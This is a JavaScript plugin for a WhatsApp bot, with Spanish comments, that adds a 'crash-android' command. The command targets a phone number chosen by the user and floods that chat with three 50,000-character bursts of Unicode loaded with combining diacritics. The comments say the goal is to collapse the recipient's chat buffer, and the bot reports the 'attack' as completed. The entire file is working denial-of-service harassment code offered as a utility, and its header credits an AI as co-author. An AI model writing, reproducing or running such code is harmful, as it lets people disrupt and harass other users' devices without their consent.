/* * 👑 CRASH-ANDROID TEXT-ONLY - Misa-Bot
 * Ejecuta una ráfaga de texto de alta entropía.
 * Uso: crash-android 54911xxxx
 * Autor: Yanniel & Gemini
 */

const crashTextOnly = {
    name: 'crash-android',
    alias: ['ca', 'ctext'],
    category: 'utilidades',
    noPrefix: true,

    run: async (conn, m, { args, usedPrefix, command }) => {
        const chat = m.key.remoteJid
        
        // 1. Validación
        if (!args[0]) {
            return conn.sendMessage(chat, { 
                text: `✧ ‧₊˚ *MISA TEXT SYSTEM* ୧ֹ˖ ⑅ ࣪⊹\n\n✰ \`Uso\`: *${usedPrefix + command} [número]*` 
            }, { quoted: m })
        }

        try {
            let targetNum = args[0].replace(/[^0-9]/g, '')
            let targetJid = targetNum + '@s.whatsapp.net'
            
            // --- TU TEXTO GUARDADO ---
            // Reemplaza esto con tu mensaje
            const miTextoGuardado = `TU_TEXTO_AQUI`; 

            // Función para generar 50k Unicodes únicos (Alta Entropía)
            const generarCarga = (cant) => {
                let str = ""
                const bloques = [0x12000, 0x13000, 0x14400, 0x17000, 0x1D400]
                for (let i = 0; i < cant; i++) {
                    let bloque = bloques[i % bloques.length]
                    str += String.fromCodePoint(bloque + (i % 800))
                    // Inyectamos diacríticos cada 5 para forzar el dibujo vertical
                    if (i % 5 === 0) str += String.fromCodePoint(0x0345) 
                }
                return str
            }

            // Reacción de "Disparo"
            await conn.sendMessage(chat, { react: { text: '🔥', key: m.key } })

            // --- FASE 1: Tu texto personalizado ---
            await conn.sendMessage(targetJid, { text: miTextoGuardado })

            // --- FASE 2: Ráfaga de Unicodes (Triple impacto) ---
            // Enviamos 3 mensajes seguidos de 50k cada uno para colapsar el buffer del chat
            for (let i = 0; i < 3; i++) {
                await conn.sendMessage(targetJid, { text: generarCarga(50000) })
            }

            // Confirmación para ti
            await conn.sendMessage(chat, { 
                text: `🚀 *¡Ataque de texto completado!*\n\n> Objetivo: @${targetNum}\n> Ráfagas: 3 x 50k Unicodes + Tu texto.`,
                mentions: [targetJid]
            }, { quoted: m })

        } catch (err) {
            console.error('Error en crash-text:', err)
        }
    }
}

export default crashTextOnly
